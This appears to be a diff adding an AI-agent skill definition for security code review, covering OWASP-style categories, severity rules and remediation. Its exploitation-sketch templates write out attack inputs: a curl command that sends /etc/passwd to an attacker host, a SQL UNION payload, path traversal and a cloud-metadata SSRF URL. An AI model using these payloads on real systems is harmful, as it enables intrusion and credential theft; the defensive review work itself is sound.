@@ -1,0 +1,377 @@
+---
+id: skillsgit-curated/security-code-review-pass
+version: 1.0.0
+name: Security Code Review Pass
+description: Second-pass security review of a diff or file set focused on OWASP-shaped issues, authn/authz gaps, injection, secrets, and crypto misuse.
+authors:
+  - name: skillsgit Curated
+    handle: skillsgit-curated
+    role: author
+category: engineering
+tags: [security, code-review, owasp, sast, appsec, vulnerabilities, secrets, authentication]
+license_type: free
+pricing:
+  currency: USD
+  support_included: false
+ai:
+  required_models: [claude-opus-4-7]
+  compatible_models: [claude-sonnet-4-6, gpt-4o, gpt-4.1]
+  tools_required: [file_io]
+  tools_optional: [web_search]
+  min_context_tokens: 32000
+  estimated_tokens_per_invocation: 9000
+trigger_keywords:
+  - security review
+  - security code review
+  - appsec review
+  - owasp review
+  - check for vulnerabilities
+  - secure code review
+  - find security issues
+  - injection check
+  - auth review
+  - secrets scan
+  - threat model this code
+  - second-pass security
+  - pre-release security review
+example_invocations:
+  - "Do a security pass over this diff before we ship."
+  - "Run an OWASP-shaped review on the new payment endpoint."
+  - "Audit this PR for auth, injection, and secret handling."
+inputs:
+  - name: code
+    type: text
+    required: true
+    description: Diff or full file contents to audit. Whole-file content gives stronger results than diff-only.
+  - name: stack
+    type: text
+    required: false
+    description: Language, framework, runtime — e.g. "Python 3.12, Django 5, Postgres, deployed on EKS".
+  - name: trust_boundaries
+    type: text
+    required: false
+    description: Where untrusted input enters the system (HTTP body, query, headers, third-party callbacks, file uploads, message queues).
+  - name: sensitive_data
+    type: text
+    required: false
+    description: What data this code touches (PII, payment, health, credentials, internal IP) so the agent can rank impact correctly.
+  - name: framework_protections
+    type: text
+    required: false
+    description: Protections you rely on the framework to provide (e.g., Django ORM parameter binding, helmet headers, framework CSRF middleware).
+outputs:
+  - name: security_report
+    type: markdown
+    description: Findings grouped by severity with CWE-like classification, exploitation sketch, and remediation.
+  - name: findings_json
+    type: json
+    description: "Structured findings: id, severity, category, cwe, file, line range, evidence, exploitation, remediation, false_positive_likelihood."
+changelog:
+  - version: 1.0.0
+    date: 2026-05-14
+    notes: Initial release. Subscription includes ongoing updates as OWASP and CWE top-N lists evolve.
+---
+
+# Security Code Review Pass
+
+## When to use
+
+Use this skill when a developer is about to merge or ship a change that touches user input handling, authentication, authorization, secrets, cryptography, database access, file paths, network calls, deserialization, or any other historically dangerous code surface — and wants a focused security pass that is sharper than what a general-purpose review skill produces.
+
+Concrete moments to invoke:
+
+- A new HTTP endpoint, GraphQL resolver, gRPC method, or message-queue consumer is added.
+- A new auth flow, password reset, OAuth handshake, JWT signing path, session creation, or permission check appears in the diff.
+- The code changes how data is rendered into a template, an HTML page, a SQL string, a shell command, an HTTP request, a file path, a redirect URL, or a serialized payload.
+- The code changes the trust boundary: a value that was internal becomes externally controlled (e.g., a config now comes from a request header).
+- A `package.json` / `requirements.txt` / `go.mod` / `Cargo.toml` adds a dependency in the auth, crypto, parsing, or serialization area.
+- The change touches secret storage, environment variables holding credentials, or rotation logic.
+- A general PR-review skill has already passed and the author wants a focused second pass before release.
+
+Do not use this skill as a substitute for: real penetration testing on a running system; full taint-analysis over an entire codebase; SAST/DAST tooling; threat modeling that covers more than the diff; or compliance attestation (PCI/HIPAA/SOC2 controls evaluation).
+
+The skill is built to err toward false positives in high-impact categories (auth bypass, injection, secret leakage) and to err toward false negatives in low-impact, high-volume categories (e.g., verbose error pages on internal admin tools). Each finding carries a `false_positive_likelihood` so the reviewer can triage quickly.
+
+## Inputs
+
+| Input | Required | Purpose |
+| --- | --- | --- |
+| `code` | yes | The diff or files to audit. |
+| `stack` | no | Lets the agent apply framework-specific knowledge (Django's auto-escaping, Rails' strong params, Spring's CSRF defaults). |
+| `trust_boundaries` | no | Where untrusted input enters; helps the agent treat that input as tainted. |
+| `sensitive_data` | no | What's at stake; used to set severity correctly. |
+| `framework_protections` | no | What the agent should *not* re-flag because the framework already handles it. |
+
+## How to apply
+
+The skill follows a fixed pipeline so audits are repeatable and reviewable.
+
+### Stage 1 — Establish the threat surface
+
+1. Identify entry points in the diff: route handlers, RPC methods, queue consumers, CLI entry points, webhook receivers, file watchers. For each, note the input shape (path, query, body, header, cookie, attachment).
+2. Identify sinks in the diff: database queries (raw or ORM with raw fragments), HTML rendering, template strings, shell commands, file path joins, URL redirects, deserialization (`pickle`, `yaml.load`, Java native deserialization, `Marshal.load`, `JSON.parse` of untrusted with `reviver`), reflection, dynamic code execution (`eval`, `exec`, `Function`, `setTimeout` with a string, `vm.runInThisContext`), network egress (HTTP, DNS lookups by hostname constructed from input), logging of secrets.
+3. Build a taint plan: from every entry, list the sinks it can reach inside the diff. If the user supplied `framework_protections`, mark which sinks are protected (e.g., Django ORM with `Model.objects.filter(field=x)` is safe; `Model.objects.raw(...)` is not).
+4. If `trust_boundaries` was supplied, treat every named source as tainted. If it was not, assume any value originating from an HTTP request, a message body, a file upload, an external API response, a database column not under exclusive write control, or a process environment variable not set at deploy time is tainted.
+5. Mark high-impact targets: anything that touches `sensitive_data` (PII, payment, credentials, health, internal IPs), anything that runs with elevated privileges, anything that writes to logs that ship outside the trust boundary.
+
+### Stage 2 — Run the category sweep
+
+For each category, walk every changed file and produce findings. A finding has: id, severity, category, CWE-like classification, file, line range, evidence (the smallest code excerpt the agent paraphrases), exploitation sketch, remediation, and `false_positive_likelihood` (low / medium / high).
+
+6. **Injection — SQL.** Look for raw string concatenation or f-string interpolation building SQL. ORM `raw()` / `extra()` / `Sql.query` with interpolated values. Bound parameter mismatches (using `%s` with `format()` instead of the driver's parameterizer). NoSQL injection: MongoDB queries built from untrusted dicts without operator stripping; Mongoose queries with `$where` and concatenation. CWE-89.
+7. **Injection — Command and OS.** `subprocess` calls with `shell=True` and untrusted arguments; `os.system`, `Runtime.exec(String)`, `exec`/`spawn` in Node with shell strings, backticks in Ruby with interpolation. Argument arrays are safer than strings — flag string forms. CWE-78, CWE-77.
+8. **Injection — Template / XSS / SSTI.** Server-side template rendering with `safe`/`mark_safe`/`raw`/`triple-braces` applied to user input. Client-side `dangerouslySetInnerHTML`, `innerHTML`, `document.write`, `bypassSecurityTrust*`. Server-rendered HTML where the variable interpolation skips auto-escaping. Untrusted YAML/JSON loaded into a templating context that supports expression evaluation. CWE-79, CWE-1336.
+9. **Injection — Path and LFI.** `open()`, `fs.readFile`, `Files.newInputStream` with paths built from input. Look for `..` not being stripped, absolute-path takeover (input that starts with `/` overriding a base), null-byte injection in old runtimes, symlink-following without checks, archive extraction that lets entries escape (zip slip). CWE-22, CWE-23.
+10. **Injection — Header and CRLF.** Setting response headers from input without stripping `\r`/`\n`. URL building where the user controls the host portion (SSRF — see also category 13). CWE-93.
+11. **Injection — Log forging.** Logging user input without sanitization of newlines or control characters; structured logs ingest user input into a field that downstream parsers trust. CWE-117.
+12. **Authentication.** New auth code paths missing rate limiting on credential checks. Password storage with weak algorithms (MD5, SHA-1, SHA-256 without a slow KDF, fast bcrypt cost, plain hash without salt). Password reset tokens not being single-use or not being cryptographically random or having long lifetimes. JWT verification using `alg=none` accepted, or symmetric verification with a key fetched from headers, or algorithm confusion between HS256 and RS256. Session IDs that are predictable, short, or sent in URLs. Remember-me tokens that don't rotate on login. Multi-factor flows that can be skipped. CWE-287, CWE-294, CWE-307, CWE-916.
+13. **Authorization.** Any new route or handler without an authorization check; permission checks that compare the wrong identifier (path parameter `userId` to current user, but the resource belongs to a different user — IDOR); role checks evaluated client-side only; resource lookups by primary key without an ownership filter (`Post.find(params[:id])` instead of `current_user.posts.find(params[:id])`); cross-tenant queries missing tenant filter; check-time-of-use vs use-time gaps; admin-only endpoints whose check is only a feature-flag boolean. CWE-285, CWE-639, CWE-863, CWE-862.
+14. **Cryptography.** Use of MD5/SHA-1 for security purposes. ECB mode. Hard-coded IVs, salts, or keys. Custom crypto. Bringing your own random (`Math.random()`, `Random()` without secure variant, `rand()` without `/dev/urandom`). Key length below 2048 bits for RSA. Reusing a nonce in a stream cipher or AES-GCM. Constant-time comparison missing on secret equality. PRNG seeded predictably. Disabled cert verification (`verify=False`, `rejectUnauthorized: false`, `InsecureSkipVerify: true`). TLS version pinning below 1.2. CWE-327, CWE-330, CWE-295.
+15. **Secrets and credentials.** Hard-coded API keys, tokens, private keys, passwords. Heuristics: 20+ char base64-like strings or hex strings near identifier names like `key`, `token`, `secret`, `password`, `credential`, `apikey`, `aws_`, `bearer`. Secrets in default config files committed to the repo. Secrets logged at info/debug. Secrets read into wide scopes (module-level). Secrets serialized in error responses. CWE-798, CWE-532.
+16. **Deserialization.** `pickle.loads`, `cPickle.loads`, `yaml.load` without `SafeLoader`, `marshal.loads`, `eval`, Java `ObjectInputStream.readObject` of untrusted bytes, .NET `BinaryFormatter`/`SoapFormatter`, PHP `unserialize`, Node `node-serialize`, `JSON.parse` with a custom reviver invoking dynamic code. CWE-502.
+17. **SSRF.** HTTP clients fetching URLs built from untrusted input where the destination is not a strict allowlist. Cloud metadata endpoints (`169.254.169.254`, GCP, Azure) reachable from server code. DNS rebinding risk: resolving the host once then using a different connection. CWE-918.
+18. **Open redirect.** Redirect targets read from query/body without an allowlist. CWE-601.
+19. **CSRF and request-origin.** State-changing endpoints (POST/PUT/DELETE/PATCH) without CSRF protection or token verification on cookie-authenticated sessions. SameSite cookie set to `None` without `Secure` or without a reason. `Access-Control-Allow-Origin: *` combined with `Access-Control-Allow-Credentials: true`. CWE-352.
+20. **HTTP security headers.** Missing or weakened `Content-Security-Policy`, `X-Content-Type-Options`, `Strict-Transport-Security`, `Referrer-Policy`, `X-Frame-Options`. If the framework normally adds these, only flag changes that remove them.
+21. **File uploads.** Content-type trusted from the client without server-side sniffing; extension trusted; filenames written to disk unescaped; uploads served from a directory inside the web root with `Content-Disposition: inline`; image processing libs invoked on untrusted bytes without sandboxing (ImageMagick policy.xml absent); zip slip; entity expansion (XXE, billion laughs) on XML parsers without external-entity disabling.
+22. **Concurrency and race.** Time-of-check/time-of-use on auth or file paths. Read-modify-write on shared mutable state without transactions. Idempotency keys missing on operations that the client may retry (double-charge risk).
+23. **Error handling and information disclosure.** Stack traces returned to clients. Verbose 500s. Different error messages for "user exists" vs "user not exists" (user enumeration). Different timing for the two cases. Detailed error fields leaking schema. Health endpoints exposing version/internal details on the public network.
+24. **Dependency hygiene (diff-scope only).** New direct dependencies in the diff: flag for follow-up — does the team know this package? Is it well-maintained? Does it have known CVEs? The skill itself does not query CVE feeds; it lists new dependencies for the human to check.
+25. **Business-logic abuse.** Reasoning patterns that look exploitable in context: discount codes that can be replayed, refund flows that don't verify ownership, free-tier limits enforced client-side, signup forms with no anti-automation. These are hard to spot mechanically — call them out only with high specificity and a `false_positive_likelihood: medium` or higher.
+
+### Stage 3 — Suppress what the framework handles
+
+26. Re-walk findings and remove any that contradict `framework_protections`. For example, if the user said "Django ORM is used", remove SQL-injection findings against parameterized `.filter()` calls; only keep ones against `raw()`/`extra()`/`RawSQL`/`cursor.execute(query, ...)` with `query` built by string ops.
+27. If a finding's evidence is genuinely ambiguous, lower confidence rather than removing — output the finding with `false_positive_likelihood: high` and a clarifying question for the author.
+
+### Stage 4 — Rank by severity
+
+28. Assign severity using impact × likelihood:
+    - **Critical** — direct path from public input to data loss, account takeover, RCE, or financial loss. Block release.
+    - **High** — exploitable with motivated attacker; significant data or trust impact. Fix before release.
+    - **Medium** — defense-in-depth weakness; risky if combined with another issue.
+    - **Low** — minor hardening opportunity; harmless on its own.
+    - **Informational** — pattern worth knowing; no current exploit.
+29. Combine `sensitive_data` to upgrade severity: a SQL injection on a feature-flag table is High; on a payments table it is Critical.
+30. Combine entry-point reach: if the entry point is unauthenticated and public, never downgrade below High when a real injection or auth bypass is identified.
+
+### Stage 5 — For each finding, write the four-part block
+
+31. **Evidence.** Reference file and line range. Paraphrase the dangerous shape (e.g., "the request body's `target_url` is passed to `requests.get` without an allowlist") — do not paste large code blocks verbatim from the user's diff back at them.
+32. **Exploitation sketch.** Describe the attacker's path in 2-4 sentences. Specific. "An attacker sends `target_url=http://169.254.169.254/latest/meta-data/iam/...` and reads the response from the health endpoint, recovering the IAM credentials."
+33. **Remediation.** Concrete change, ideally with a one-line diff direction. "Replace with: parse `target_url`, look up the host in `ALLOWED_HOSTS`, reject if absent; resolve once and pass the IP literal to `requests.get` to prevent DNS rebinding."
+34. **References.** A CWE id where it cleanly maps, and (optionally) the OWASP top-10 category. Avoid linking to arbitrary blog posts.
+
+### Stage 6 — Compose the report
+
+35. Open with a summary block: counts by severity, the dominant categories, and the agent's overall verdict (Block release / Fix before release / Acceptable with caveats / Clean).
+36. List Critical and High findings first, in full. List Medium next. Bucket Low and Informational into a compressed list at the end.
+37. Add a "Coverage caveats" section: any input the agent could not reach, any sink it could not trace because callers were not provided, framework protections it took on faith, dependency CVEs it did not check.
+38. Add a "Recommended follow-up" section: at most three items the agent thinks the team should do beyond this diff (e.g., "add a CI gate that fails when `subprocess.*(shell=True)` is added").
+39. Never claim "no vulnerabilities found" — claim "no vulnerabilities found in scope" and restate the scope. Real systems always have unknown unknowns.
+
+### Stage 7 — Self-check
+
+40. Re-walk every finding and ask: could a reasonable senior security engineer disagree? If yes, mark `false_positive_likelihood: medium` or `high` and explain why.
+41. Verify line-number anchors against the diff. Inaccurate anchors destroy trust faster than missed findings.
+42. Cap Informational findings at 6 so the report stays readable.
+43. If the agent finds nothing at any severity, that is a real signal — say so plainly and list what categories were checked clean. Do not invent findings to pad the report.
+
+### Stage 8 — Language and framework specifics
+
+The category sweep above is language-agnostic. The agent overlays the following framework-specific patterns where applicable.
+
+44. **Django / Flask / FastAPI (Python).** Django: `raw()`, `extra()`, `RawSQL`, `cursor.execute` with f-strings. `request.GET.get` flowing into `render()` with `safe`. `csrf_exempt` decorator on state-changing views — needs justification. `ALLOWED_HOSTS=['*']`. `DEBUG=True` in committed config. New `urls.py` routes lacking `@login_required` or `permission_required`. Flask: `render_template_string` with input. `send_file` with user-controlled path. FastAPI: dependency-injection auth missing on routers; `response_model` omitted on endpoints returning ORM objects (over-fetching disclosure).
+45. **Express / NestJS (Node).** Routes without auth middleware where peers have it. `app.use(cors())` with no origin list. `body-parser` limits removed. `helmet` disabled. `res.redirect(req.query.url)`. Custom auth that compares secrets without `crypto.timingSafeEqual`. `req.params.id` used directly as a Mongo `_id` without ObjectId validation (NoSQL operator-injection if it's an object).
+46. **Rails.** `find` vs `find_by!` on params without scoping; `params.permit!`; `html_safe` on input; `render inline:` with input; `system`/`exec` with interpolation; ActiveRecord `where(\"name = '#{params[:n]}'\")` style; mass assignment via deep `update` without strong params.
+47. **Spring (Java/Kotlin).** Missing `@PreAuthorize` on new controller methods where the package convention uses them. `@CrossOrigin(origins = \"*\")`. `Spring Expression Language` evaluation with input. JPA `@Query` with concatenation. New endpoints in a controller annotated `@RestController` that bypass the project's auth filter chain.
+48. **Go (net/http, gin, echo).** Routes added without middleware that other routes apply. `template.HTML(input)` rendered. `os/exec.Command(\"sh\", \"-c\", str)`. `http.Get(req.FormValue(\"url\"))`. `crypto/rand` vs `math/rand` for tokens.
+49. **GraphQL.** New resolver missing auth check. Field-level authorization missing on sensitive fields. Query depth limit absent. Aliasing/batching denial-of-service vector not capped. Introspection enabled in production. Error formatter leaking stack traces.
+50. **JWT-handling code.** `jwt.decode` with `verify=False` or `algorithms=[\"none\"]`. Symmetric verification with a key set from a request header or claim (`alg` from header, `kid` lookup against attacker-controlled URL). Tokens accepted without `exp` check. Tokens accepted without `aud`/`iss` verification when the issuer is multi-tenant.
+51. **OAuth.** Authorization-code flow without PKCE on public clients. State parameter missing or not single-use. Redirect URI matched by substring rather than equality. Tokens stored in browser local storage in a SPA when cookies would be safer.
+52. **Cookies.** New `Set-Cookie` without `Secure`, without `HttpOnly`, without `SameSite`. Session cookies lacking a binding to the IP/UA when the rest of the app uses one.
+53. **Cloud-shaped patterns.** S3 bucket policies changed to public; presigned URL TTLs too long; signed URLs lacking content-type pinning; IAM role policies broadened with `*`; KMS keys with no rotation; environment variables holding secrets at function-level rather than secret-manager references; Terraform/IaC: security groups opened `0.0.0.0/0` on non-HTTP ports.
+54. **Container and supply chain.** `Dockerfile` `USER root`; package install from untrusted URL with `curl | sh`; `latest` tag in deployment manifests; image without digest pinning; build-time secrets leaked into image layers.
+55. **Cryptocurrency / smart-contract context (if detected).** Reentrancy on external calls before state updates; integer overflow on token math in non-Solidity 0.8+ code; missing access modifiers; unchecked `transfer` return value; signature replay without nonce. Note: the skill flags shapes but defers true contract audits to specialists.
+
+### Stage 9 — Trust-aware re-ranking
+
+56. After all findings exist, re-rank using the trust path:
+    - Unauthenticated public endpoint + injection or auth bypass → never lower than Critical.
+    - Authenticated endpoint + tenant filter missing → High minimum; Critical if data is sensitive.
+    - Internal-only endpoint (network-restricted) + injection → High maximum unless it crosses a privilege boundary.
+    - Background worker reading from queue under team control → Medium maximum unless the queue is fed by user input.
+57. Look for finding combos that compound: an SSRF + an IAM role on the same service is a credential-exfiltration path — surface the combination explicitly, not just the two findings.
+58. Identify "defense-in-depth-only" findings (e.g., missing CSP on a JSON-only API) and explicitly label them as such so the team can decide whether to invest.
+
+### Stage 10 — Reporting hygiene
+
+59. Be precise about scope. "I reviewed the diff; I did not read X" should appear when X (test files, generated code, vendor code, lockfiles) was skipped. The skill never silently skips files without saying so.
+60. Avoid alarmism. "Critical" is a heavy word; if the agent is uncertain, downgrade and explain. A security review that flags everything as Critical trains the team to ignore the review.
+61. Avoid false certainty about exploitability. Hedging is honest: "Exploitable if the upstream LB does not strip this header — verify the LB config."
+62. For each Critical or High finding, include a one-line "If you fix only one thing in this PR" pointer at the top of the report so the author can sequence work even if they don't read every card.
+63. If the same shape appears in many places (e.g., 10 routes all missing auth), report it as one finding with a list of locations, not 10 separate findings.
+64. Do not propose remediation that requires architectural changes outside the diff unless the change is genuinely necessary; offer a localized fix first, an architectural follow-up second.
+
+### Stage 11 — Severity assignment table
+
+Use the table when impact and likelihood need a quick consistency check. Pick the row by worst plausible outcome, the column by exploitability, and read severity. Override with judgement if context (sensitive data, public exposure) warrants.
+
+```
+                              trivial-to-exploit    needs-conditions    needs-deep-chain
+account takeover / RCE        Critical              Critical            High
+data exfiltration             Critical              High                High
+privilege escalation          Critical              High                Medium
+data tampering                High                  High                Medium
+information disclosure        High                  Medium              Low
+DOS / abuse                   Medium                Medium              Low
+defense-in-depth weakness     Medium                Low                 Low
+hardening recommendation      Low                   Informational       Informational
+```
+
+### Stage 12 — Sample exploitation sketches by category
+
+Below are templates for the "exploitation sketch" field. Each describes the attacker's path in concrete terms. The agent adapts the template to the specific code, never reusing the template verbatim.
+
+65. **SQL injection.** "An attacker who can submit `<field>` controls the query body. Submitting `' UNION SELECT password FROM users --` would cause the database to return password hashes in place of the expected payload."
+66. **Command injection.** "An attacker who controls `<field>` and reaches the shell call submits `; curl <attacker>/$(cat /etc/passwd)` and exfiltrates server files via the outbound HTTP."
+67. **SSRF.** "An attacker submits `<url>` pointing to the cloud metadata endpoint (`http://169.254.169.254/...`) and reads back the temporary IAM credentials in the response."
+68. **IDOR.** "An attacker authenticated as user 1234 sends `GET /api/orders/5678` (an order belonging to user 9999). Because the lookup is by primary key without a tenancy filter, the response includes another user's data."
+69. **Auth bypass via JWT.** "An attacker mints a token with `alg=none` and a self-chosen subject claim. Because the verifier accepts `none`, the request is treated as authenticated."
+70. **Mass assignment.** "An attacker submits `is_admin=true` in the body of the profile-update form. Because the controller passes the full params hash to `update`, the privileged field is set."
+71. **Reflected XSS.** "An attacker crafts a URL whose a query parameter contains a script-tag payload and emails it to a victim. The server reflects the param into the response without escaping; the victim's browser executes the script in the application's origin."
+72. **Open redirect.** "An attacker constructs `<url>?next=https://phish.example/login` and emails it; the app's login flow redirects after auth to the attacker's site, where credentials are harvested under the application's branding."
+73. **Path traversal.** "An attacker submits `<filename>=../../etc/passwd` to a download endpoint that joins the input with a base directory; the server reads and returns the file from outside the intended directory."
+74. **Insecure deserialization.** "An attacker constructs a serialized payload whose reduction calls `os.system`. When the server deserializes the payload, arbitrary code runs in the worker process."
+75. **Crypto misuse — ECB.** "An attacker observes ciphertexts and identifies repeated blocks; for predictable plaintext (e.g., a fixed header), they confirm structure and selectively swap blocks to forge messages."
+76. **Crypto misuse — predictable token.** "An attacker observes one token and computes the PRNG state; subsequent tokens are predictable, enabling impersonation of arbitrary users."
+77. **CSRF.** "An attacker hosts a page that auto-submits a POST to the application's endpoint. A victim authenticated to the application visits the page; the browser attaches session cookies and the action is performed under the victim's identity."
+
+### Stage 13 — Cross-finding combinatorics
+
+Single findings are sometimes acceptable risk; combinations are not. Always check whether independently-reported findings compose into a worse outcome.
+
+78. SSRF + cloud IAM role on the host → IAM credential exfiltration. Upgrade severity to Critical even if SSRF alone was High.
+79. IDOR + administrative action → unauthorized admin operation. Upgrade severity.
+80. XSS + cookie missing `HttpOnly` → session hijacking. Upgrade XSS severity.
+81. Open redirect + OAuth flow → token theft. Upgrade open-redirect severity.
+82. Weak crypto + token reuse window → impersonation. Upgrade severity.
+83. Permissive CORS + credentialed cookies → cross-origin data theft. Upgrade severity.
+84. Mass assignment + role field on the model → privilege escalation. Upgrade severity.
+
+### Stage 14 — Remediation patterns
+
+Each remediation should be specific. The patterns below are starting points; the agent adapts them to the code.
+
+85. **For SQL injection:** parameterized queries via the driver's binding API; ORM `filter(field=value)`; if dynamic identifiers (table names, column names) are needed, allowlist them against a set of legal values.
+86. **For command injection:** prefer the argv-array form of `subprocess`/`exec`; if shell features are needed, build a list of validated arguments and never interpolate user data into the command string.
+87. **For SSRF:** allowlist hosts; resolve once and pass the IP literal; block private IP ranges including IPv6 link-local; disable URL redirects in the HTTP client; set a short timeout.
+88. **For IDOR:** scope the query by the current principal — `current_user.orders.find(id)` rather than `Order.find(id)`; or perform an explicit ownership check before returning.
+89. **For JWT issues:** verify with a fixed algorithm; pin to `RS256` (asymmetric) or `HS256` (shared secret) and reject any other `alg`; verify `exp`, `iss`, `aud`; rotate signing keys.
+90. **For mass assignment:** allowlist permitted fields explicitly (`params.permit(:name, :email)`, `pydantic` model with explicit fields, etc.); never pass the raw input to the model's setter.
+91. **For weak crypto:** use the language's standard high-level recipe (`bcrypt`/`argon2` for passwords; AES-GCM with random nonces; ed25519 or RSA-PSS for signatures; `secrets`/`crypto/rand` for tokens).
+92. **For deserialization:** prefer JSON; if a richer format is needed, use a safe loader (`yaml.safe_load`); never deserialize untrusted bytes with `pickle`, `Marshal`, `BinaryFormatter`.
+93. **For CSRF:** double-submit cookie or same-site-strict cookies; framework CSRF middleware; reject state-changing requests lacking the token.
+94. **For path traversal:** resolve the joined path and verify it stays under the intended base via realpath comparison; reject `..` and absolute-path inputs at the API edge.
+
+### Stage 15 — Reviewing AI-generated security-critical code
+
+When the agent detects that the change was AI-generated (common patterns: monolithic single-commit additions, comment styles unusual for the project, identifier choices inconsistent with the codebase), apply extra scrutiny.
+
+95. Verify any cited library APIs exist; LLMs hallucinate cryptographic functions confidently.
+96. Verify constant-time comparisons are actually constant-time (`crypto.timingSafeEqual`, `hmac.compare_digest`) and not the language's normal `==`.
+97. Verify any random-number use is from the cryptographic API, not the general-purpose one.
+98. Verify that "secure by default" framework features have not been silently disabled with a flag the LLM added "because the tests failed."
+99. Be suspicious of newly introduced security boundaries (auth middleware, permission decorators) — verify they actually run on the new routes and have not been bypassed by `app.use` ordering or decorator omission.
+
+## Outputs
+
+- `security_report` (markdown) — the human-readable report described above.
+- `findings_json` (JSON array) — each finding with: `id` (slug), `severity`, `category`, `cwe`, `file`, `line_start`, `line_end`, `evidence`, `exploitation`, `remediation`, `references` (array of URLs/IDs), `false_positive_likelihood`. The host app can stream this into a ticket tracker or PR comment system.
+
+## Examples
+
+**Input (placeholder):**
+
+Stack: "Node 20, Express 4, Postgres via `pg`, secrets in env vars."
+
+Trust boundaries: "HTTP request body, query, headers."
+
+Diff: a new admin route that fetches a report given a date range, plus a helper that builds a SQL string.
+
+**Agent reasoning (abbreviated):**
+
+- Entry point: `POST /admin/reports`. Auth middleware seen — but is it admin-only? Re-check: middleware called is `requireAuth`, not `requireAdmin`. Auth/authz finding: critical (admin route guarded as if it were a user route). CWE-285.
+- Sink: the helper builds `SELECT ... WHERE created_at BETWEEN '${from}' AND '${to}'`. The dates are passed straight from `req.body`. SQL injection — Critical. CWE-89.
+- Header check: the new route returns `Cache-Control: public` on what appears to be private data. Information disclosure — Medium.
+- Secret check: nothing committed.
+- Crypto check: nothing crypto-related.
+
+**Output (abbreviated):**
+
+```
+**Summary:** 1 critical, 1 critical, 1 medium. **Verdict:** block release.
+
+### [CRITICAL] SQL injection in admin report query — CWE-89
+File: src/routes/admin/reports.ts lines 41-46
+Evidence: the helper interpolates request-body fields directly into the SQL string ...
+Exploitation: an attacker with auth ... can dump arbitrary tables via the `from` field.
+Remediation: use parameterized queries. ...
+False-positive likelihood: low.
+
+### [CRITICAL] Authorization gap on admin route — CWE-285
+File: src/routes/admin/reports.ts lines 12
+Evidence: the route is mounted behind `requireAuth`, not `requireAdmin`.
+...
+```
+
+## Worked example two — clean diff
+
+**Input:** a 3-file diff that adjusts an internal admin route's pagination defaults from 25 to 50 records per page. Stack: Rails 7, Postgres. Trust boundaries: HTTP request body and query. Sensitive data: customer support tickets.
+
+**Agent reasoning:**
+
+- Entry point: existing admin route, unchanged auth path.
+- Sink: the existing `Ticket.where(...).limit(per_page)` query, now defaulting to 50.
+- Sweep: no new sinks; no auth surface change; no crypto; no secret; no template change.
+- Performance hint (out of scope for this skill): the default change might widen response times. Note but do not flag as a security issue.
+- Verdict: nothing in scope.
+
+**Output (abbreviated):**
+
+```
+**Summary:** 0 critical, 0 high, 0 medium, 0 low, 1 informational.
+**Verdict:** clean within scope.
+
+Coverage caveats: I examined the new diff under the assumption that the
+existing auth filter still applies to the route as it did before; verify
+the filter is still in `before_action` for the admin controller. I did
+not query CVE feeds for dependency changes (none added).
+
+### [INFO] pagination default increase may widen response times
+File: app/controllers/admin/tickets_controller.rb lines 22
+Note: not a security finding; included for visibility because the prior
+default protected against accidental large responses. Consider keeping
+a per-page upper bound in addition to the default.
+```
+
+## Limitations
+
+- The skill performs textual analysis, not runtime testing. It will miss vulnerabilities that depend on race conditions, exact memory layout, or external service behavior.
+- It does not query CVE databases. Dependency findings are limited to "you added a new dependency — verify it."
+- It cannot detect vulnerabilities whose exploit depends on code outside the diff and not provided as context.
+- Business-logic vulnerabilities are inherently harder to spot than syntactic patterns; the skill is conservative here.
+- The skill is calibrated for web/server stacks. Mobile-specific (iOS keychain misuse, Android intent leaks), embedded, kernel, and smart-contract review need specialists.
+- A clean finding from this skill does not constitute a pentest, SOC2 control, or compliance attestation.
+
+## Sources reviewed
+
+- https://github.com/PyCQA/bandit (Apache-2.0)
+- https://github.com/securego/gosec (Apache-2.0)
+- https://github.com/gitleaks/gitleaks (MIT)
+- https://github.com/awslabs/git-secrets (Apache-2.0)
+- https://github.com/zaproxy/zaproxy (Apache-2.0)
+- https://github.com/analysis-tools-dev/static-analysis (MIT)
+- https://github.com/reviewdog/reviewdog (MIT)
+- https://github.com/Nayjest/Gito (MIT)
+- https://github.com/Nikita-Filonov/ai-review (Apache-2.0)
